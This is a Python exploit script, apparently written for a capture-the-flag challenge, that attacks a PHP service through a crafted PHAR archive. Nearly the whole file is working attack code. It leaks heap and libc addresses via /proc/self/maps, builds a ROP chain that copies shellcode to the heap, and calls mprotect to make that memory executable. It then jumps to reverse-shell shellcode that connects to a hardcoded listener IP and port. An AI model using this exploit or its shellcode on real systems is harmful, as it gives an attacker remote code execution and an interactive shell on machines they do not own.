#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Author: madrat

from pwn import *
from exploit import Interactor
import subprocess
from base64 import b64encode, b64decode
import json

PHAR_ARCHIVE_NAME = "vzlom.phar"

LIBC_MPROTECT_OFFSET = 0x00000000000F6550
ADD_RSP_X148_RET = 0x0000000000038B51
MOV_PTR_RAX_RDI_RET = 0x00000000000870EB
POP_RAX_RET = 0x000000000003BE88
POP_RDI_RET = 0x0000000000023796
POP_RSI_RET = 0x000000000002590F
POP_RDX_RET = 0x00000000000C8ACD


def create_phar(payload: bytes):
    subprocess.run(
        [
            "php",
            "--define",
            "phar.readonly=0",
            "create_phar.php",
            PHAR_ARCHIVE_NAME,
            payload.hex(),
        ],
        check=True,
    )


def generate_shellcode(listener_port=1337, listener_ip="172.27.157.137"):
    """Generates a reverse shell shellcode for the given listener IP and port."""
    ip = bytes.fromhex("".join([f"{int(x):02X}" for x in listener_ip.split(".")]))
    port = struct.pack(">h", listener_port)
    shellcode = (
        b"\x68"
        + ip
        + b"\x66\x68"
        + port
        + b"\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"
    )

    shellcode += b"\x90" * (8 - len(shellcode) % 8)

    return shellcode


def main():
    maps_file: str = Interactor.readfile_full("/proc/self/maps", False, 61000).split(
        "\n"
    )
    # print(maps_file)

    # with open("maps", "w") as f:
    #     f.write(maps_file)
    # filehoover_b64 = Interactor.readfile_full(
    #     "/usr/local/lib/php/extensions/no-debug-non-zts-20190902/filehoover.so",
    #     True,
    #     58511,
    # )[4:]

    # with open("filehoover.so", "wb") as f:
    #     f.write(b64decode(filehoover_b64))

    for line in maps_file:
        if "heap" in line:
            heap_base = int(line.split("-")[0], 16)
            log.info(f"heap_base: {hex(heap_base)}")
            break

    for line in maps_file:
        if "libc-" in line:
            libc_base = int(line.split("-")[0], 16)
            log.info(f"libc_base: {hex(libc_base)}")
            break

    shellcode_location = heap_base + 0x20000
    shellcode_bytes = generate_shellcode()

    rop_chain = b""

    # Skip part of the stack that get corrupted while returning from PHP_METHOD
    rop_chain += p64(libc_base + ADD_RSP_X148_RET)
    rop_chain += b"B" * 0x148
    rop_chain += p64(libc_base + ADD_RSP_X148_RET)
    rop_chain += b"C" * 0x148

    # 1. Copy shellcode to heap location
    for i in range(0, len(shellcode_bytes), 8):
        shellcode_chunk = shellcode_bytes[i : i + 8]

        # Where to write
        rop_chain += p64(libc_base + POP_RAX_RET)
        rop_chain += p64(shellcode_location + i)

        # What to write
        rop_chain += p64(libc_base + POP_RDI_RET)
        rop_chain += shellcode_chunk

        # Write
        rop_chain += p64(libc_base + MOV_PTR_RAX_RDI_RET)

    # 2. Call mprotect

    # Set the first argument to the shellcode location
    rop_chain += p64(libc_base + POP_RDI_RET)
    rop_chain += p64(shellcode_location)

    # Set the second argument to the page size
    rop_chain += p64(libc_base + POP_RSI_RET)
    rop_chain += p64(0x1000)

    # Set the third argument to RWX
    rop_chain += p64(libc_base + POP_RDX_RET)
    rop_chain += p64(0x7)

    # Do the call to mprotect
    rop_chain += p64(libc_base + LIBC_MPROTECT_OFFSET)

    # 3. Jump to shellcode
    rop_chain += p64(shellcode_location)

    create_phar(b"A" * 2168 + rop_chain)
    Interactor.send_phar(PHAR_ARCHIVE_NAME)


if __name__ == "__main__":
    main()
